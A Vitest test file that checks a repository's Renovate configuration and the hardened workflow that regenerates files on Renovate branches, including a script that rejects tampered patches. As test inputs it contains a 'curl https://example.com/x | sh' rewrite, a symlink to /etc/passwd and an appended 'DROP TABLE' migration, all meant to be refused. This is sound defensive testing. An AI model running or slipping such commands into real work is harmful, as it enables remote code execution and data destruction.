// Renovate's config (.github/renovate.json5) and the workflow that regenerates the generated files
// on its branches (.github/workflows/renovate-regen.yml, with tools/renovate-regen.mjs): what
// docs/maintaining.md says they do. Renovate itself cannot run here; `pnpm dlx --package renovate
// renovate-config-validator --strict` validates the config against Renovate's schema. tools:test's
// inputs include both files, so a change to either re-runs these.
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, readdirSync, readFileSync, symlinkSync, unlinkSync } from 'node:fs';
import { dirname, join, relative, resolve } from 'node:path';
import { runInNewContext } from 'node:vm';
import { describe, expect, it } from 'vitest';
import { catalogVersions, dockerfiles, dockerfileVersions, LOCKSTEP } from '../check-versions.mjs';
import { loadManifest } from '../lib/generated.mjs';
import { ADD_ONLY, problems } from '../renovate-regen.mjs';
import { update } from '../vendor-skills.mjs';
import { commitAll, makeRepo, writeFile } from './helpers.mjs';

const REPO = resolve(import.meta.dirname, '../..');
const read = (path) => readFileSync(join(REPO, path), 'utf8');

/** JSON5 is a subset of JavaScript's object literals: evaluated in an empty context. */
const renovate = runInNewContext(`(${read('.github/renovate.json5')}\n)`);
const rules = renovate.packageRules;
const catalog = catalogVersions(REPO);

/** Renovate's `matchPackageNames` entry `pattern` (an exact name, or a glob ending in `/*`). */
const matchesName = (pattern, name) =>
  pattern.endsWith('/*')
    ? name.startsWith(pattern.slice(0, -1)) && !name.slice(pattern.length - 1).includes('/')
    : pattern === name;
const rulesFor = (name) =>
  rules.filter((r) => r.matchPackageNames?.some((pattern) => matchesName(pattern, name)));
/** What the last matching rule sets, as Renovate merges package rules in order. */
const setting = (name, key) => rulesFor(name).findLast((r) => key in r)?.[key];
/** A Renovate regex string (`/…/`) as a RegExp. */
const regex = (pattern) => {
  expect(pattern).toMatch(/^\/.*\/$/);
  return new RegExp(pattern.slice(1, -1));
};

describe('Renovate (.github/renovate.json5)', () => {
  it('re-runs these checks whenever one of the files they read changes', () => {
    expect(JSON.parse(read('tools/package.json')).nx.targets.test.inputs).toEqual(
      expect.arrayContaining([
        '{workspaceRoot}/.github/renovate.json5',
        '{workspaceRoot}/.github/workflows/*.yml',
        '{workspaceRoot}/pnpm-workspace.yaml',
        '{workspaceRoot}/**/Dockerfile',
        '{workspaceRoot}/docker-compose*.yml',
        '{workspaceRoot}/.agents/skills/**/*',
      ]),
    );
  });

  it('holds the stack to the versions it supports', () => {
    expect(setting('vitest', 'allowedVersions')).toBe('<5');
    expect(setting('@vitest/browser-playwright', 'allowedVersions')).toBe('<5');
    expect(setting('typescript', 'allowedVersions')).toBe('<6.1');
    expect(setting('graphql', 'allowedVersions')).toBe('<17');
    expect(setting('pnpm', 'allowedVersions')).toBe('<12');
    // the production database's major (Railway's Postgres 18)
    expect(setting('postgres', 'allowedVersions')).toBe('<19');
    // Node: even majors only, the LTS lines (Renovate's node versioning also waits for LTS day)
    const lts = regex(setting('node', 'allowedVersions'));
    for (const version of ['24.21.0', '24.22.0-trixie-slim', '26.0.0', 'v28.1.0'])
      expect(lts.test(version), version).toBe(true);
    for (const version of ['25.0.0', '27.1.0-trixie-slim', '23.11.0', 'v19.0.0'])
      expect(lts.test(version), version).toBe(false);
  });

  it('leaves Nx and its plugins to `nx migrate` (skill nx-upgrade)', () => {
    const nx = Object.keys(catalog).filter((name) => name === 'nx' || name.startsWith('@nx/'));
    expect(nx.length).toBeGreaterThan(1);
    for (const name of nx) expect(setting(name, 'enabled'), name).toBe(false);
    expect(read('.agents/skills/nx-upgrade/SKILL.md')).toContain('Renovate');
  });

  it('moves the catalog entries tools/check-versions.mjs keeps in lockstep in one PR', () => {
    for (const [lead, follower] of LOCKSTEP) {
      const names = follower.endsWith('/*')
        ? Object.keys(catalog).filter((name) => matchesName(follower, name))
        : [follower];
      for (const name of [lead, ...names].filter((n) => n in catalog)) {
        // Nx: not updated at all (above)
        if (setting(lead, 'enabled') === false) expect(setting(name, 'enabled'), name).toBe(false);
        else
          expect(setting(name, 'groupName'), `${lead} and ${name}`).toBe(
            setting(lead, 'groupName'),
          );
      }
      if (setting(lead, 'enabled') !== false) expect(setting(lead, 'groupName'), lead).toBeTruthy();
    }
  });

  it('bumps Node and pnpm at every pin tools/check-versions.mjs compares, in one PR each', () => {
    // .node-version (nodenv), .prototools (proto) and package.json#packageManager (npm) are read
    // by Renovate's own managers; the Dockerfiles' `pnpm@<version>` by this regex manager
    expect(setting('node', 'groupName')).toBe('Node');
    expect(setting('@types/node', 'groupName')).toBe('Node');
    expect(setting('pnpm', 'groupName')).toBe('pnpm');
    const managers = renovate.customManagers.filter(
      (m) => m.depNameTemplate === 'pnpm' && m.datasourceTemplate === 'npm',
    );
    expect(managers).toHaveLength(1);
    const [manager] = managers;
    const patterns = manager.managerFilePatterns.map(regex);
    const files = dockerfiles(REPO);
    expect(files).toEqual(expect.arrayContaining(['apps/api/Dockerfile', 'apps/web/Dockerfile']));
    for (const file of [
      ...files,
      'Containerfile',
      'apps/x/Dockerfile.prod',
      'docker/web.Dockerfile',
    ])
      expect(
        patterns.some((p) => p.test(file)),
        file,
      ).toBe(true);
    for (const file of files) {
      const text = read(file);
      const pins = dockerfileVersions(text).pnpm.map(([, version]) => version);
      const found = manager.matchStrings.flatMap((s) =>
        [...text.matchAll(new RegExp(s, 'g'))].map((m) => m.groups.currentValue),
      );
      expect(pins.length, file).toBeGreaterThan(0);
      expect(found, file).toEqual(pins);
    }
  });

  it('has Renovate pin every image the repository runs by digest (its first run opens the PR)', () => {
    const images = [
      ...dockerfiles(REPO).flatMap((file) =>
        [...read(file).matchAll(/^FROM\s+(?:--\S+\s+)*([^\s:@]+)/gm)].map((m) => m[1]),
      ),
      ...['docker-compose.yml', 'docker-compose.stack.yml'].flatMap((file) =>
        [...read(file).matchAll(/^\s+image:\s*([^\s:@]+)/gm)].map((m) => m[1]),
      ),
    ];
    expect(new Set(images)).toEqual(new Set(['node', 'postgres']));
    for (const image of images) expect(setting(image, 'pinDigests'), image).toBe(true);
  });

  it('follows the tags of the prereleases it updates, and never automerges them', () => {
    expect(renovate.automerge).not.toBe(true);
    const prereleases = Object.entries(catalog).filter(([, version]) => /^\d[\d.]*-/.test(version));
    expect(prereleases.map(([name]) => name)).toEqual(
      expect.arrayContaining(['drizzle-orm', 'drizzle-kit', 'nitro']),
    );
    for (const [name] of prereleases) {
      expect(setting(name, 'automerge'), name).toBe(false);
      expect(setting(name, 'followTag'), name).toBeTruthy();
    }
    // Drizzle's latest tag is still 0.x, and its other prereleases are branch builds
    expect(setting('drizzle-orm', 'followTag')).toBe('rc');
    expect(setting('nitro', 'followTag')).toBe('latest');
    // the Pothos plugin is built against one Drizzle
    expect(setting('@pothos/plugin-drizzle', 'groupName')).toBe(
      setting('drizzle-orm', 'groupName'),
    );
  });

  it("treats the regen workflow's commits as Renovate's own: it keeps updating the branch", () => {
    const email = read('.github/workflows/renovate-regen.yml').match(
      /^ {2}REGEN_AUTHOR_EMAIL: '([^']+)'$/m,
    )?.[1];
    expect(email).toBe('41898282+github-actions[bot]@users.noreply.github.com');
    expect(renovate.gitIgnoredAuthors).toContain(email);
    // and the workflow skips the push of its own commit
    expect(read('.github/workflows/renovate-regen.yml')).toContain(
      `github.event.head_commit.author.email != '${email}'`,
    );
  });
});

/** The jobs of a workflow (two-space `jobs:` entries), by id, as text. */
function jobs(text) {
  const body = text.slice(text.indexOf('\njobs:\n') + '\njobs:\n'.length);
  return Object.fromEntries(
    body
      .split(/^(?= {2}[\w-]+:$)/m)
      .map((block) => [block.match(/^ {2}([\w-]+):$/m)?.[1], block])
      .filter(([id]) => id),
  );
}

/**
 * The steps of a job's text (its `- ` entries at six spaces): the action each uses (`owner/repo`
 * and its ref) and its `with:` inputs, as text.
 */
function steps(job) {
  return job
    .split(/^(?= {6}- )/m)
    .slice(1)
    .map((step) => {
      const [, action, ref] = step.match(/^ {6}(?:- | {2})uses: ([^@\s]+)@(\S+)/m) ?? [];
      const inputs = step.match(/^ {8}with:\n((?: {10}.*\n?)*)/m)?.[1] ?? '';
      return {
        action,
        ref,
        with: Object.fromEntries(
          [...inputs.matchAll(/^ {10}([\w-]+): (.*)$/gm)].map((m) => [m[1], m[2]]),
        ),
      };
    });
}

/** The relative modules `file` imports, recursively, failing on any import but Node's built-ins. */
function localImports(file, seen = new Set()) {
  if (seen.has(file)) return seen;
  seen.add(file);
  const text = readFileSync(file, 'utf8');
  expect(text, file).not.toMatch(/\bimport\(|\brequire\(|createRequire/);
  for (const [, from, bare] of text.matchAll(/\bfrom\s+'([^']+)'|^import\s+'([^']+)'/gm)) {
    const spec = from ?? bare;
    if (spec.startsWith('node:')) continue;
    expect(spec, `${relative(REPO, file)} imports ${spec}`).toMatch(/^\.\.?\//);
    localImports(resolve(dirname(file), spec), seen);
  }
  return seen;
}

describe('renovate-regen (.github/workflows/renovate-regen.yml)', () => {
  const raw = read('.github/workflows/renovate-regen.yml');
  // without its comment lines, which name what it must not do
  const text = raw.replaceAll(/^\s*#.*\n/gm, '');
  const { regen, push } = jobs(text);
  const email = text.match(/^ {2}REGEN_AUTHOR_EMAIL: '([^']+)'$/m)?.[1];

  it("runs for pushes to this repository's Renovate branches, never for a fork's pull request", () => {
    expect(text).toMatch(/^on:\n {2}push:\n {4}branches: \['renovate\/\*\*'\]\n\n/m);
    // pull_request_target would hand a fork's code this repository's secrets
    expect(text).not.toMatch(/pull_request|workflow_run/);
    expect(text).toMatch(/^permissions: \{\}$/m);
    expect(Object.keys(jobs(text))).toEqual(['regen', 'push']);
  });

  it('runs the update in a job that holds no secret and only a read-only token', () => {
    expect(regen).toContain('run: pnpm install --frozen-lockfile');
    expect(regen).toContain('run: pnpm regen');
    expect(regen).not.toContain('secrets.');
    expect(regen).not.toContain('create-github-app-token');
    expect(regen).toMatch(/\n {4}permissions:\n {6}contents: read\n {4}\w/);
    expect(regen).toContain('persist-credentials: false');
    // nothing to do without the App: not even a runner
    expect(regen).toMatch(/if: >-\n\s+vars\.AUTOMATION_APP_CLIENT_ID != ''/);
  });

  it('restores no cache in the job that can push: a job that runs the update could write one', () => {
    const used = steps(push);
    // each action of the job, reviewed: a new one must show it reads no cache either
    expect(used.map((s) => s.action).filter(Boolean)).toEqual([
      'actions/checkout',
      'actions/setup-node',
      'actions/download-artifact',
      'actions/create-github-app-token',
    ]);
    for (const step of used) {
      expect(step.action ?? '', 'actions/cache').not.toMatch(/^actions\/cache\b/);
      // setup-toolchain restores ~/.proto (node, pnpm) from the branch's cache unless told not to
      if (step.action === 'moonrepo/setup-toolchain') expect(step.with.cache).toBe('false');
      // setup-node caches only with `cache`, or by itself for npm (package-manager-cache)
      if (step.action === 'actions/setup-node') {
        expect(step.with).not.toHaveProperty('cache');
        expect(step.with['package-manager-cache']).toBe('false');
        // the commit's Node, not the runner image's
        expect(step.with['node-version-file']).toBe('.node-version');
      }
    }
    // the check it runs loads Node's built-in modules and the commit's tools/ files only
    const modules = [...localImports(join(REPO, 'tools/renovate-regen.mjs'))];
    expect(modules.map((m) => relative(REPO, m))).toEqual([
      'tools/renovate-regen.mjs',
      'tools/lib/generated.mjs',
    ]);
  });

  it('saves no cache from the job that runs the update; it restores what CI on main saved', () => {
    const used = steps(regen);
    const toolchain = used.find((s) => s.action === 'moonrepo/setup-toolchain');
    expect(toolchain?.with).toEqual({ 'auto-install': 'true', cache: 'false' });
    const caches = used.filter((s) => s.action?.startsWith('actions/cache'));
    expect(caches.map((s) => s.action)).toEqual(['actions/cache/restore']);
  });

  it('pins every action to a commit, with its version as a comment', () => {
    const refs = [...raw.matchAll(/^\s+(?:- )?uses: (.*)$/gm)].map((m) => m[1]);
    expect(refs.length).toBeGreaterThan(5);
    for (const ref of refs)
      expect(ref).toMatch(/^[\w.-]+\/[\w./-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/);
  });

  it('gives its own push a concurrency group of its own: in the shared one it would cancel its run', () => {
    expect(email).toBe('41898282+github-actions[bot]@users.noreply.github.com');
    const group = text.match(/^concurrency:\n {2}group: (.*)\n {2}cancel-in-progress: true$/m)?.[1];
    expect(group).toBe(
      `renovate-regen-\${{ github.ref }}\${{ github.event.head_commit.author.email == '${email}' && format('-{0}', github.sha) || '' }}`,
    );
  });

  it('pushes only a patch of what pnpm regen writes, from a job that runs none of the update', () => {
    expect(push).toContain('needs: regen');
    // no install, no script of the repository's but the check
    expect(push).not.toMatch(/^\s*(?:run:\s*)?pnpm\s/m);
    expect([...push.matchAll(/^\s*(?:run:\s*)?node\s+(\S+)/gm)].map((m) => m[1])).toEqual([
      'tools/renovate-regen.mjs',
    ]);
    expect(push).toMatch(/\n {4}permissions:\n {6}contents: read\n {4}\w/);
    expect(push).toContain('persist-credentials: false');
    // staged in the index only: the check runs from the commit's own files, then the commit, then
    // a token for this repository's contents alone, then a plain push
    const order = [
      'git apply --cached ',
      'node tools/renovate-regen.mjs check',
      'commit --quiet',
      'uses: actions/create-github-app-token@',
      'git push origin "HEAD:refs/heads/$BRANCH"',
    ].map((step) => push.indexOf(step));
    expect(order.every((at) => at > 0)).toBe(true);
    expect(order).toEqual(order.toSorted((a, b) => a - b));
    expect([...push.matchAll(/permission-[\w-]+: \w+/g)].map((m) => m[0])).toEqual([
      'permission-contents: write',
    ]);
    expect(push).not.toMatch(/git push[^\n]*(?:--force|\s-f\b|\+)/);
  });
});

describe('tools/renovate-regen.mjs check', () => {
  const MANIFEST = {
    artifacts: [
      { id: 'gql', paths: ['src/gql/**'], regen: 'true' },
      {
        id: 'db-migrations',
        paths: ['migrations/**'],
        regen: 'drizzle-kit generate',
        protect: 'tracked',
      },
    ],
  };
  // a vendor manifest as tools/vendor-skills.mjs reads it
  const VENDOR = {
    packages: { pkg: { version: '1.0.0', license: 'MIT', licenseFiles: ['LICENSE'] } },
    skills: {
      tool: {
        package: 'pkg',
        file: 'SKILL.md',
        sha256: 'a'.repeat(64),
        rewrites: [{ replace: 'npx tool', with: 'pnpm exec tool' }],
      },
    },
  };
  /** VENDOR with `pkg` at `version` and skill `tool` at `sha256`: what `vendor-skills update` writes. */
  const pinned = (version, sha256) => ({
    ...VENDOR,
    packages: { pkg: { ...VENDOR.packages.pkg, version } },
    skills: { tool: { ...VENDOR.skills.tool, sha256 } },
  });
  const MIGRATION = 'migrations/0001_init/migration.sql';
  const FILES = {
    '.agents/generated.json': MANIFEST,
    '.agents/vendor.json': VENDOR,
    '.agents/vendor/pkg/LICENSE': 'MIT License\n',
    '.agents/vendor/pkg/NOTES': 'written by hand\n',
    [MIGRATION]: 'CREATE TABLE "notes" ("id" integer);\n',
    'src/gql/graphql.ts': 'export {};\n',
    'src/gql/old.ts': 'export {};\n',
    'src/app.ts': 'export {};\n',
  };
  /**
   * A repo with `files` (generated files and a source), committed after `setup` ran in it, and
   * `change` staged as the workflow stages it; the check's exit code and output.
   */
  function staged(change, { files = FILES, setup = () => {} } = {}) {
    const root = makeRepo(files);
    setup(root);
    commitAll(root);
    const git = (...args) => execFileSync('git', args, { cwd: root, encoding: 'utf8' });
    change(root);
    git('add', '--all');
    const patch = git('diff', '--cached', '--binary', '--no-renames');
    git('reset', '-q', '--hard');
    git('clean', '-qfd');
    writeFile(root, 'regen.patch', patch);
    git('apply', '--cached', 'regen.patch');
    unlinkSync(join(root, 'regen.patch'));
    const res = spawnSync(process.execPath, [join(REPO, 'tools/renovate-regen.mjs'), 'check'], {
      cwd: root,
      encoding: 'utf8',
    });
    return { code: res.status, out: `${res.stdout}${res.stderr}` };
  }

  it('passes regenerated, new and deleted generated files', () => {
    const res = staged((root) => {
      writeFile(root, 'src/gql/graphql.ts', 'export const changed = 1;\n');
      writeFile(root, 'src/gql/new.ts', 'export {};\n');
      unlinkSync(join(root, 'src/gql/old.ts'));
    });
    expect(res.out).toContain('3 regenerated files');
    expect(res.code, res.out).toBe(0);
  });

  it('passes a new migration, and refuses a change to or the deletion of a committed one', () => {
    const added = staged((root) =>
      writeFile(root, 'migrations/0002_next/migration.sql', 'ALTER TABLE "notes" ADD "x" text;\n'),
    );
    expect(added.code, added.out).toBe(0);
    // SQL appended to a migration that has run: fresh databases (tests, e2e, new ones) would run it
    const changed = staged((root) =>
      writeFile(root, MIGRATION, `${FILES[MIGRATION]}DROP TABLE x;\n`),
    );
    expect(changed.code).toBe(1);
    expect(changed.out).toContain(
      `${MIGRATION}: changes a committed file of db-migrations (\`drizzle-kit generate\` only adds new ones)`,
    );
    const deleted = staged((root) => unlinkSync(join(root, MIGRATION)));
    expect(deleted.code).toBe(1);
    expect(deleted.out).toContain(`${MIGRATION}: deletes a committed file of db-migrations`);
  });

  it("holds the repository's own migrations to additions (.agents/generated.json)", () => {
    const manifest = loadManifest(REPO);
    expect([...ADD_ONLY]).toEqual(['db-migrations']);
    expect(manifest.artifacts.find((a) => a.id === 'db-migrations')?.paths).toEqual([
      'packages/db/migrations/**',
    ]);
    const dir = readdirSync(join(REPO, 'packages/db/migrations'), { withFileTypes: true }).find(
      (d) => d.isDirectory(),
    );
    expect(dir, 'a committed migration').toBeTruthy();
    const committed = `packages/db/migrations/${dir.name}/migration.sql`;
    expect(problems([{ oldMode: '100644', mode: '100644', path: committed }], manifest)).toEqual([
      expect.stringContaining(`${committed}: changes a committed file of db-migrations`),
    ]);
    const next = 'packages/db/migrations/29991231000000_next/migration.sql';
    expect(problems([{ oldMode: '000000', mode: '100644', path: next }], manifest)).toEqual([]);
  });

  it('refuses a change to any other file, naming it', () => {
    const res = staged((root) => {
      writeFile(root, 'src/gql/graphql.ts', 'export const changed = 1;\n');
      writeFile(root, 'src/app.ts', 'export const injected = 1;\n');
    });
    expect(res.code).toBe(1);
    expect(res.out).toContain('src/app.ts: not a generated file');
    expect(res.out).not.toContain('src/gql/graphql.ts:');
  });

  it('passes the pins and license files vendor-skills update writes on a Playwright or drizzle-kit bump', () => {
    const res = staged((root) => {
      // oxfmt formats it after the update: the layout may change too
      writeFile(root, '.agents/vendor.json', JSON.stringify(pinned('1.1.0', 'b'.repeat(64))));
      writeFile(root, '.agents/vendor/pkg/LICENSE', 'MIT License\n\nCopyright 2026\n');
      writeFile(root, 'src/gql/graphql.ts', 'export const changed = 1;\n');
    });
    expect(res.out).toContain('3 regenerated files');
    expect(res.code, res.out).toBe(0);
  });

  it('passes what the real vendor-skills update writes for a bump: the producer, not a fixture', () => {
    // a repo with one vendored skill, as tools/test/vendor-skills.test.mjs builds it
    const files = {
      '.gitignore': 'node_modules/\n',
      '.agents/generated.json': {
        artifacts: [
          {
            id: 'vendored-skills',
            paths: ['.agents/skills/demo/**'],
            regen: 'node tools/vendor-skills.mjs update',
            protect: 'tracked',
          },
        ],
      },
      '.agents/vendor.json': {
        packages: {
          'demo-pkg': { version: '1.0.0', license: 'MIT', licenseFiles: ['LICENSE'] },
        },
        skills: {
          demo: {
            package: 'demo-pkg',
            file: 'skills/demo/SKILL.md',
            sha256: '',
            rewrites: [{ replace: 'npx demo-cli', with: 'pnpm exec demo-cli' }],
          },
        },
      },
    };
    /** demo-pkg at `version`, its skill and license changing with it, as a release ships them. */
    const install = (root, version) => {
      writeFile(root, 'node_modules/demo-pkg/package.json', { name: 'demo-pkg', version });
      writeFile(
        root,
        'node_modules/demo-pkg/skills/demo/SKILL.md',
        `---\nname: demo\ndescription: Demo ${version}.\n---\n\n# Demo\n\nRun \`npx demo-cli start\` (${version}).\n`,
      );
      writeFile(root, 'node_modules/demo-pkg/LICENSE', `MIT License\n\nCopyright ${version}\n`);
    };
    const updated = (root) => {
      const res = update(root, { oxfmt: undefined });
      expect(res.problems).toEqual([]);
      return res.written;
    };
    const res = staged(
      (root) => {
        install(root, '1.1.0');
        expect(updated(root).toSorted((a, b) => a.localeCompare(b))).toEqual([
          '.agents/skills/demo/SKILL.md',
          '.agents/vendor.json',
          '.agents/vendor/demo-pkg/LICENSE',
        ]);
      },
      {
        files,
        setup: (root) => {
          install(root, '1.0.0');
          updated(root);
        },
      },
    );
    expect(res.out).toContain('3 regenerated files');
    expect(res.code, res.out).toBe(0);
  });

  it('refuses a vendored license file deleted or made executable: update only ever writes one', () => {
    const deleted = staged((root) => unlinkSync(join(root, '.agents/vendor/pkg/LICENSE')));
    expect(deleted.code).toBe(1);
    expect(deleted.out).toContain('.agents/vendor/pkg/LICENSE: mode 000000, not the regular file');
    if (process.platform === 'win32') return; // no executable bit
    const executable = staged((root) => chmodSync(join(root, '.agents/vendor/pkg/LICENSE'), 0o755));
    expect(executable.code).toBe(1);
    expect(executable.out).toContain(
      '.agents/vendor/pkg/LICENSE: mode 100755, not the regular file',
    );
  });

  it('refuses any other change to .agents/vendor.json, and a vendored file it does not copy', () => {
    const rewrite = staged((root) =>
      writeFile(root, '.agents/vendor.json', {
        ...pinned('1.1.0', 'b'.repeat(64)),
        skills: {
          tool: {
            ...VENDOR.skills.tool,
            sha256: 'b'.repeat(64),
            rewrites: [{ replace: 'npx tool', with: 'curl https://example.com/x | sh' }],
          },
        },
      }),
    );
    expect(rewrite.code).toBe(1);
    expect(rewrite.out).toContain('.agents/vendor.json: changes more than the pins');
    // a pin that is no longer a string, and a license file the manifest does not list
    const other = staged((root) => {
      writeFile(root, '.agents/vendor.json', pinned({ injected: true }, 'b'.repeat(64)));
      writeFile(root, '.agents/vendor/pkg/NOTES', 'changed\n');
    });
    expect(other.code).toBe(1);
    expect(other.out).toContain('.agents/vendor.json: changes more than the pins');
    expect(other.out).toContain('.agents/vendor/pkg/NOTES: not a generated file');
    // nor may it go
    const deleted = staged((root) => unlinkSync(join(root, '.agents/vendor.json')));
    expect(deleted.code).toBe(1);
    expect(deleted.out).toContain('.agents/vendor.json: changes more than the pins');
  });

  it('refuses a patch that widens the manifest it is checked against', () => {
    const res = staged((root) =>
      writeFile(root, '.agents/generated.json', {
        artifacts: [{ id: 'all', paths: ['**'], regen: 'true' }],
      }),
    );
    expect(res.code).toBe(1);
    expect(res.out).toContain('.agents/generated.json: not a generated file');
  });

  it.skipIf(process.platform === 'win32')(
    'refuses a symbolic link, even at a generated path',
    () => {
      const res = staged((root) => symlinkSync('/etc/passwd', join(root, 'src/gql/link.ts')));
      expect(res.code).toBe(1);
      expect(res.out).toContain('src/gql/link.ts: mode 120000, not a plain file');
    },
  );
});
